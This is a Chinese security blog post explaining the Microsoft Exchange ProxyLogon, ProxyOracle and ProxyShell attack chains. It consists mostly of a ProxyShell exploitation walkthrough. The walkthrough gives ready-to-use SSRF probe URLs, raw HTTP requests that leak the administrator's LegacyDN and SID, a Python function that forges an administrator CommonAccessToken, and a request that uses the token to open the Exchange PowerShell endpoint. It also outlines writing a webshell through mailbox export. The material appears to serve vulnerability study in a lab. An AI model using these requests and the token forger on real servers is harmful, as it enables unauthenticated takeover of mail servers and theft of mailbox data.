

<!DOCTYPE html>
<html lang="zh" color-mode=light>
<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title> - 春风十里</title>
  <meta name="apple-mobile-web-app-capable" content="yes" />
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta name="google" content="notranslate" />
  
  <meta name="description" content="一、Exchange 攻击链Devcore 公司的首席...">
  <meta name="author" content="K1ng">
  <link rel="icon" href="/images/icons/favicon-16x16.png" type="image/png" sizes="16x16">
  <link rel="icon" href="/images/icons/favicon-32x32.png" type="image/png" sizes="32x32">
  <link rel="apple-touch-icon" href="/images/icons/apple-touch-icon.png" sizes="180x180">
  <meta rel="mask-icon" href="/images/icons/stun-logo.svg" color="#333333">
  
    <meta rel="msapplication-TileImage" content="/images/icons/favicon-144x144.png">
    <meta rel="msapplication-TileColor" content="#000000">
  

  
<link rel="stylesheet" href="/css/style.css">


  
    
<link rel="stylesheet" href="https://at.alicdn.com/t/font_1445822_p6ry5n7lrr.css">

  

  
    
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css">

  

  
    
      
        
        
<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/xcode.min.css" name="highlight-style" mode="light">

      
        
        
<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/solarized-dark.min.css" name="highlight-style" mode="dark">

      
  

  <script>
    var CONFIG = window.CONFIG || {};
    var ZHAOO = window.ZHAOO || {};
    CONFIG = {
      isHome: false,
      fancybox: true,
      pjax: false,
      loading: {
        gif: '/images/theme/loading.gif',
        lottie: ''
      },
      lazyload: {
        enable: true,
        only_post: 'false',
        loading: {
          gif: '/images/theme/loading.gif',
          lottie: ''
        }
      },
      donate: {
        enable: true,
        alipay: 'https://pic.izhaoo.com/alipay.jpg',
        wechat: 'https://pic.izhaoo.com/wechat.jpg'
      },
      galleries: {
        enable: true
      },
      fab: {
        enable: true,
        always_show: false
      },
      carrier: {
        enable: true
      },
      daovoice: {
        enable: false
      },
      preview: {
        background: {
          default: '',
          api: ''
        },
        motto: {
          default: '我在开了灯的床头下，想问问自己的心啊。',
          typing: true,
          api: 'https://v2.jinrishici.com/one.json',
          data_contents: '["data","content"]'
        },
      },
      qrcode: {
        enable: true,
        type: 'url',
        image: 'https://pic.izhaoo.com/weapp-code.jpg',
      },
      toc: {
        enable: true
      },
      scrollbar: {
        type: 'default'
      },
      notification: {
        enable: false,
        delay: 4500,
        list: '',
        page_white_list: '',
        page_black_list: ''
      },
      search: {
        enable: false,
        path: ''
      }
    }
  </script>

  

  

<meta name="generator" content="Hexo 6.0.0"></head>

<body class="lock-screen">
  <div class="loading" id="loading"></div>
  
    


  
  

<nav class="menu">
  <div class="menu-container">
    <div class="menu-close">
      <i class="iconfont iconbaseline-close-px"></i>
    </div>
    <ul class="menu-content"><li class="menu-item">
        <a href="/ " class="underline "> 首页</a>
      </li><li class="menu-item">
        <a href="/galleries/ " class="underline "> 摄影</a>
      </li><li class="menu-item">
        <a href="/archives/ " class="underline "> 归档</a>
      </li><li class="menu-item">
        <a href="/tags/ " class="underline "> 标签</a>
      </li><li class="menu-item">
        <a href="/categories/ " class="underline "> 分类</a>
      </li><li class="menu-item">
        <a href="/about/ " class="underline "> 关于</a>
      </li></ul>
    
      <div class="menu-copyright"><p>Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme - <a target="_blank" href="https://github.com/izhaoo/hexo-theme-zhaoo">zhaoo</a></p></div>
    
  </div>
</nav>
  <main id="main">
  <div class="article-wrap">
    <div class="row container">
      <div class="col-xl-3"></div>
      <div class="col-xl-6"><article class="article">
  <div class="wrap">
    <section class="head">
  <img   class="lazyload" data-original="/images/theme/post-image.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  draggable="false">
  <div class="head-mask">
    <h1 class="head-title"></h1>
    <div class="head-info">
      <span class="post-info-item"><i class="iconfont iconcalendar"></i>March 09, 2022</span>
      
      <span class="post-info-item"><i class="iconfont iconfont-size"></i>48215</span>
    </div>
  </div>
</section>
    <section class="main">
      <section class="content">
        
        <h1 id="一、Exchange-攻击链"><a href="#一、Exchange-攻击链" class="headerlink" title="一、Exchange 攻击链"></a>一、Exchange 攻击链</h1><p>Devcore 公司的首席安全研究员 Orange Tsai 和他的团队 2021 年发现了 8 个 Exchange 漏洞，涵盖服务端、客户端和加密协议。通过这些新的攻击面，组合产生了三个攻击链：</p>
<ul>
<li>ProxyLogon — 最知名、影响力也最大的 Exchange 攻击链</li>
<li>ProxyOracle — 一个可以还原任意 Exchange 使用者明文密码的攻击链</li>
<li>ProxyShell —  Pwn2Own 2021 上展示的 Exchange 的攻击链</li>
</ul>
<p><img    class="lazyload" data-original="https://cdn.nlark.com/yuque/0/2021/png/1618485/1630213603977-b1baaed5-5b44-4621-9caf-52d7a3b5aa93.png#clientId=ua934db88-dbfc-4&from=paste&height=1062&id=u64f07073&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1062&originWidth=2560&originalType=binary&ratio=1&size=708508&status=done&style=none&taskId=udfba8c4e-165d-4eab-b809-2789e771b34&width=2560" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image.png</span></p>
<h1 id="一、ProxyLogon"><a href="#一、ProxyLogon" class="headerlink" title="一、ProxyLogon"></a>一、ProxyLogon</h1><p>全球最知名的 Exchange Server 漏洞，由 Orange Tsai 发现。<br>如果Exchange服务443端口暴露在公网，未经身份验证的攻击者可以在 Microsoft Exchange 上执行任意代码，ProxyLogon 攻击链利用了2个漏洞：</p>
<ul>
<li>CVE-2021-26855：预身份验证 SSRF 导致身份验证绕过</li>
<li>CVE-2021-27065：身份验证绕过后通过任意文件写入导致 RCE</li>
</ul>
<h1 id="二、ProxyOracle"><a href="#二、ProxyOracle" class="headerlink" title="二、ProxyOracle"></a>二、ProxyOracle</h1><ul>
<li>CVE-2021-31196</li>
<li>CVE-2021-31195</li>
</ul>
<h1 id="三、ProxyShell"><a href="#三、ProxyShell" class="headerlink" title="三、ProxyShell"></a>三、ProxyShell</h1><p>ProxyShell 是 Orange Tsai 在 Pwn2Own 2021 上展示的预认证 RCE 攻击链，是三个漏洞的统称，它们可被组合用于在微软 Exchange 服务器上执行未认证的远程代码。攻击者可通过在 IIS 中端口 443 运行的微软 Exchange Client Access Service (CAS) 远程组合利用这些漏洞：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34473"><strong>CVE-2021-34473</strong></a>：SSRF 漏洞。由于在访问资源时缺乏对 URI 的验证，未经身份验证的攻击者可通过构造混淆的路径访问受限制的内部API接口，导致ACL绕过。</li>
<li><a target="_blank" rel="noopener" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34523"><strong>CVE-2021-34523</strong></a>：Exchange PowerShell 后端接口上的提权漏洞。由于在执行 Exchange PowerShell 命令之前没有进行对访问令牌的验证，攻击者可以伪造任意身份在受限制的环境中执行 Powershell 代码。</li>
<li><a target="_blank" rel="noopener" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31207"><strong>CVE-2021-31207</strong></a>：Microsoft Exchange Server 安全功能绕过漏洞。由于部分Exchange PowerShell命令接口在写入文件时未限制写入路径和后缀，导致攻击者可进行任意文件写入。</li>
</ul>
<p>ProxyShell 利用了 Exchange 服务器对于路径的不准确过滤导致的路径混淆生成的 SSRF 作为攻击入口，进而通过 SSRF 访问 &#x2F;powerShell 端点。而在 PowerShell 端点可以利用 Remote PowerShell 来将邮件信息导出到外部文件，而攻击者可以通过构造恶意邮件内容，利用邮件导出写入 webshell，从而达成命令执行。</p>
<p>ProxyShell 攻击链中的 SSRF 针对的是 <strong>Exchange Autodiscover</strong> 服务，微软引入该服务的目的是使邮件客户端软件能够轻松自动配置最小的用户输入。</p>
<p><strong>影响版本</strong></p>
<ul>
<li>Microsoft Exchange Server 2010</li>
<li>Microsoft Exchange Server 2013</li>
<li>Microsoft Exchange Server 2016</li>
<li>Microsoft Exchange Server 2019</li>
</ul>
<h2 id="1、ProxyShell-利用"><a href="#1、ProxyShell-利用" class="headerlink" title="1、ProxyShell 利用"></a>1、ProxyShell 利用</h2><p><strong>技术思路：</strong></p>
<ol>
<li>通过 SSRF，请求 AutoDiscover 服务，获取 LegacyDN；</li>
<li>通过 mapi&#x2F;emsmdb 接口带入 LegacyDN 的值，获取 500 sid 的值；</li>
<li>利用 sid 构造 CommonAccessToken，将 &#x2F;PowerShell&#x2F; 重写为 &#x2F;Autodiscover&#x2F; 以触发路径混淆错误，触发ssrf，然后使用相应的 CommonAccessToken 添加到查询字符串 X-Rps-CAT，获取 Exchange 的 powershell management shell。</li>
<li>通过 smtp 发送我们加密编码后的 webshell payload。</li>
<li>利用 Exchange Powershell 命令 New-ManagementRoleAssignment 授予我们自己的邮箱导入导出角色，New-MailboxExportRequest 将 ASPX Webshell 文件写入本地 UNC 路径；</li>
<li>获取到 webshell。</li>
</ol>
<p><img    class="lazyload" data-original="https://cdn.nlark.com/yuque/0/2021/png/1618485/1630483127821-ee5ade99-cae8-4b37-940f-e502e7a68fda.png#clientId=u572e2de2-18e4-4&from=paste&id=ue5b8bdb0&margin=%5Bobject%20Object%5D&name=image.png&originHeight=430&originWidth=1516&originalType=binary&ratio=1&size=158042&status=done&style=none&taskId=u169389c9-3fd5-470f-9d73-b892c3efb4c" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image.png</span></p>
<h3 id="（1）漏洞扫描"><a href="#（1）漏洞扫描" class="headerlink" title="（1）漏洞扫描"></a>（1）漏洞扫描</h3><p>测试 payload：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>Exchange-server:<span class="hljs-number">443</span><span class="hljs-regexp">/autodiscover/</span>autodiscover.json?@foo.com<span class="hljs-regexp">/mapi/</span>nspi<span class="hljs-regexp">/?&amp;Email=autodiscover/</span>autodiscover.json%<span class="hljs-number">3</span>F@foo.com<br></code></pre></td></tr></table></figure>
<p>利用 SSRF 漏洞，实际后端访问的请求：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>Exchange-server:<span class="hljs-number">444</span><span class="hljs-regexp">/mapi/</span>nspi/<br></code></pre></td></tr></table></figure>
<p>也可以通过设置 cookie 的内容验证漏洞是否存在：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/Autodiscover/autodiscover.json?a=administrator@king.cn/mapi/nspi</span> <span class="hljs-meta">HTTP/2</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Email=Autodiscover/autodiscover.json?a=administrator@king.cn<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>0<br></code></pre></td></tr></table></figure>
<p>如果存在漏洞，则会返回当前权限状态：<br><img    class="lazyload" data-original="https://cdn.nlark.com/yuque/0/2021/png/1618485/1630475530006-ae87a8d9-df2b-4e33-8cb1-f9d15e524092.png#clientId=ub22517b2-a23a-4&from=paste&height=1288&id=ub3bad459&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1288&originWidth=2558&originalType=binary&ratio=1&size=404505&status=done&style=none&taskId=u0d133661-9e3d-40e8-92cc-6cfca148053&width=2558" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image.png</span></p>
<p>探测 Exchange 版本：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl -sk https:<span class="hljs-regexp">//</span>Exchange-server<span class="hljs-regexp">/owa/</span>auth/logon.aspx | grep favicon<br></code></pre></td></tr></table></figure>
<p><img    class="lazyload" data-original="https://cdn.nlark.com/yuque/0/2021/png/1618485/1630475588146-d8833c97-996d-45a5-ba5a-c4dc4dc5099d.png#clientId=ub22517b2-a23a-4&from=paste&height=2100&id=udff07f68&margin=%5Bobject%20Object%5D&name=image.png&originHeight=2100&originWidth=3360&originalType=binary&ratio=1&size=531758&status=done&style=none&taskId=u279fcebc-32bd-4e07-a70d-cdf61609dfc&width=3360" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image.png</span></p>
<h3 id="（2）获取-LegacyDN"><a href="#（2）获取-LegacyDN" class="headerlink" title="（2）获取 LegacyDN"></a>（2）获取 LegacyDN</h3><p>攻击链第一步：通过 SSRF，请求 AutoDiscover 服务，获取权限账户的 LDAP DN 信息，即 LegacyDN 值，进而定位到受害者账户的系统存储位置。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/Autodiscover/autodiscover.json?a=Administrator@king.cn/autodiscover/autodiscover.xml</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>172.29.60.157<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>identity<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Email=Autodiscover/autodiscover.json?a=Administrator@king.cn<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36<br>Content-Type:text/xml<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>346<br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Autodiscover</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006&quot;</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">Request</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">EMailAddress</span>&gt;</span>Administrator@king.cn<span class="hljs-tag">&lt;/<span class="hljs-name">EMailAddress</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">AcceptableResponseSchema</span>&gt;</span>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a<span class="hljs-tag">&lt;/<span class="hljs-name">AcceptableResponseSchema</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">Request</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">Autodiscover</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
<p>获取的 LegacyDN :</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">LegacyDN</span>&gt;</span>/o=king/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/cn=aeced568744f495a9a3d5177ad343e35-Administrator<span class="hljs-tag">&lt;/<span class="hljs-name">LegacyDN</span>&gt;</span><br></code></pre></td></tr></table></figure>
<p><img    class="lazyload" data-original="https://cdn.nlark.com/yuque/0/2021/png/1618485/1630476459419-25831b1d-f032-465b-9243-7ea6b7649510.png#clientId=ub22517b2-a23a-4&from=paste&height=770&id=ua29ed26b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=770&originWidth=1869&originalType=binary&ratio=1&size=271045&status=done&style=none&taskId=ud74bcc54-3aee-4cf9-8690-ea0ab860af3&width=1869" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image.png</span></p>
<h3 id="（3）获取-SID"><a href="#（3）获取-SID" class="headerlink" title="（3）获取 SID"></a>（3）获取 SID</h3><p>攻击链第二步：通过 <code>/mapi/emsmdb</code> 获取 500 SID 的值。<br>获取到对应的存储位置后，使用 SSRF 访问 &#x2F;mapi&#x2F;emsmdb 邮件传输接口，由于Exchange Web应用运行在 SYSTEM 权限下，调用 MAPI 时使用的系统权限为 SYSTEM，并非受害者账户，造成了访问 MAPI 时调用账户前后权限不一致的情况，进而触发报错，并在报错信息中泄露了受害者账户的 SID。</p>
<p>加入如下 header 头，body 带入 LegacyDN 的值。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs http">X-Requesttype:Connect<br>X-Clientinfo:&#123;2F94A2BF-A2E6-4CCCC-BF98-B5F22C542226&#125;<br>X-Clientapplication:Outlook/15.0.4815.1002<br>X-Requestid:&#123;C715155F-2BE8-44E0-BD34-2960067874C8&#125;:2<br>Content-Type:application/mapi-http<br></code></pre></td></tr></table></figure>
<p>获取 sid：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/Autodiscover/autodiscover.json?a=Administrator@king.cn/mapi/emsmdb</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>mail.echod.com<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Email=Autodiscover/autodiscover.json?a=Administrator@king.cn<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Sec-Ch-Ua</span><span class="hljs-punctuation">: </span>&quot;Chromium&quot;;v=&quot;92&quot;, &quot; Not A;Brand&quot;;v=&quot;99&quot;, &quot;Google Chrome&quot;;v=&quot;92&quot;<br><span class="hljs-attribute">Sec-Ch-Ua-Mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>X-Requesttype:Connect<br>X-Clientinfo:&#123;2F94A2BF-A2E6-4CCCC-BF98-B5F22C542226&#125;<br>X-Clientapplication:Outlook/15.0.4815.1002<br>X-Requestid:&#123;C715155F-2BE8-44E0-BD34-2960067874C8&#125;:2<br>Content-Type:application/mapi-http<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>https://mail.king.com/owa/auth/logon.aspx?url=https%3a%2f%2fmail.echod.com%2fowa%2f&amp;reason=0<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9,zh-TW;q=0.8,en-US;q=0.7,en;q=0.6<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>192<br><br><span class="language-mel">/o=king/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/cn=aeced568744f495a9a3d5177ad343e35-Administrator+%00%00%00%00%00%e4%04%00%00%09%04%00%00%09%04%00%00%00%00%00%00     </span><br><span class="language-mel"></span><br><span class="language-mel"></span><br><span class="language-mel"></span><br><span class="language-mel"># 注意：%分号段 要做urldecode</span><br></code></pre></td></tr></table></figure>

<p>报错信息会返回 User SID：<br><img    class="lazyload" data-original="https://cdn.nlark.com/yuque/0/2021/png/1618485/1630376460129-b532a8b6-ba24-4e84-a16f-6ed94dfd2025.png#clientId=u76956966-30c8-4&from=paste&height=492&id=u047e0281&margin=%5Bobject%20Object%5D&name=image.png&originHeight=492&originWidth=1080&originalType=binary&ratio=1&size=499272&status=done&style=none&taskId=uf9e55f7c-b9aa-4228-bb7f-1694e5114b1&width=1080" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image.png</span></p>
<h3 id="（4）获取-Powershell-接口"><a href="#（4）获取-Powershell-接口" class="headerlink" title="（4）获取 Powershell 接口"></a>（4）获取 Powershell 接口</h3><p>攻击链第三步：获取 Exchange 的 Powershell 管理 shell。</p>
<p>首先构造 Exchange Admin Access Token ：利用泄漏的受害者账户 SID 与 Windows 固定的特权组 SID ，构造 WIndows 系统身份认证的会话 Token。username 计算 CommonAccessToken。<br>该 Token 本应通过 HTTP 请求头 CommonAccessToken 由前端反向代理服务器构建后传输给后端，此处由于控制不严，造成 Token 对应 Header 不存在时可以通过 URL 参数解析这一行为，配合 SSRF 进一步获得Exchange 对应的 PowerShell 端点的 Exchange Remote PowerShell Management Session 权限，利用的漏洞为 CVE-2021-34523。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gen_token</span>(<span class="hljs-params">uname, sid</span>):<br>    version = <span class="hljs-number">0</span><br>    ttype = <span class="hljs-string">&#x27;Windows&#x27;</span><br>    compressed = <span class="hljs-number">0</span><br>    auth_type = <span class="hljs-string">&#x27;Kerberos&#x27;</span><br>    raw_token = <span class="hljs-string">b&#x27;&#x27;</span><br>    gsid = <span class="hljs-string">&#x27;S-1-5-32-544&#x27;</span><br> <br>    version_data = <span class="hljs-string">b&#x27;V&#x27;</span> + (<span class="hljs-number">1</span>).to_bytes(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;little&#x27;</span>) + (version).to_bytes(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;little&#x27;</span>)<br>    type_data = <span class="hljs-string">b&#x27;T&#x27;</span> + (<span class="hljs-built_in">len</span>(ttype)).to_bytes(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;little&#x27;</span>) + ttype.encode()<br>    compress_data = <span class="hljs-string">b&#x27;C&#x27;</span> + (compressed).to_bytes(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;little&#x27;</span>)<br>    auth_data = <span class="hljs-string">b&#x27;A&#x27;</span> + (<span class="hljs-built_in">len</span>(auth_type)).to_bytes(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;little&#x27;</span>) + auth_type.encode()<br>    login_data = <span class="hljs-string">b&#x27;L&#x27;</span> + (<span class="hljs-built_in">len</span>(uname)).to_bytes(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;little&#x27;</span>) + uname.encode()<br>    user_data = <span class="hljs-string">b&#x27;U&#x27;</span> + (<span class="hljs-built_in">len</span>(sid)).to_bytes(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;little&#x27;</span>) + sid.encode()<br>    group_data = <span class="hljs-string">b&#x27;G&#x27;</span> + pack(<span class="hljs-string">&#x27;&lt;II&#x27;</span>, <span class="hljs-number">1</span>, <span class="hljs-number">7</span>) + (<span class="hljs-built_in">len</span>(gsid)).to_bytes(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;little&#x27;</span>) + gsid.encode()<br>    ext_data = <span class="hljs-string">b&#x27;E&#x27;</span> + pack(<span class="hljs-string">&#x27;&gt;I&#x27;</span>, <span class="hljs-number">0</span>) <br>    <br>    raw_token += version_data<br>    raw_token += type_data<br>    raw_token += compress_data<br>    raw_token += auth_data<br>    raw_token += login_data<br>    raw_token += user_data<br>    raw_token += group_data<br>    raw_token += ext_data<br> <br>    data = base64.b64encode(raw_token).decode()<br> <br>    <span class="hljs-keyword">return</span> data<br><br><span class="hljs-comment"># S-1-5-21-803738369-70637960-3765207648-500</span><br><span class="hljs-built_in">print</span>(gen_token(<span class="hljs-string">&quot;king\\Administrator&quot;</span>,<span class="hljs-string">&quot;S-1-5-21-803738369-70637960-3765207648-500&quot;</span>))<br></code></pre></td></tr></table></figure>

<p>将生成的 Token 进行 Base64 编码带入“X-Rps-CAT”参数，验证 powershell 接口返回，如果响应代码是 200，意味着令牌已经被接受，成功获取 powershell 接口权限，然后就可以与 Powershell 端点进行通信。<br>但是，该端点是通过 WSMan 协议的 Powershell 进行远程通信的。而 WSMan 是一个基于 HTTP 与 SOAP XML 的协议。<br>利用 SOAP 格式请求 Exchange 的 Powershell 接口发送指令，可以使用 Python 库 PyPSRP 来完成相应的通信工作。<br><img    class="lazyload" data-original="https://cdn.nlark.com/yuque/0/2021/png/1618485/1630218986322-9605630d-13ab-4500-9f3c-f2fe0b0b2c34.png#clientId=ua934db88-dbfc-4&from=paste&height=338&id=u40e17c76&margin=%5Bobject%20Object%5D&name=image.png&originHeight=338&originWidth=1536&originalType=binary&ratio=1&size=57682&status=done&style=none&taskId=u7c756886-e859-433f-a87b-4ec2327a4ce&width=1536" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image.png</span></p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/Autodiscover/autodiscover.json?a=Administrator@king.cn/powershell/?X-Rps-CAT=VgFUB1dpbmRvd3NDQQhLZXJiZXJvc0wTa2luZ1xBZG1pbmlzdHJhdG9yVSpTLTEtNS0yMS04MDM3MzgzNjktNzA2Mzc5NjAtMzc2NTIwNzY0OC01MDBHAQcMUy0xLTUtMzItNTQ0RQ==</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>mail.king.cn<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>identity<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Email=Autodiscover/autodiscover.json?a=Administrator@king.cn<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/soap+xml;charset=UTF-8<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>0<br></code></pre></td></tr></table></figure>


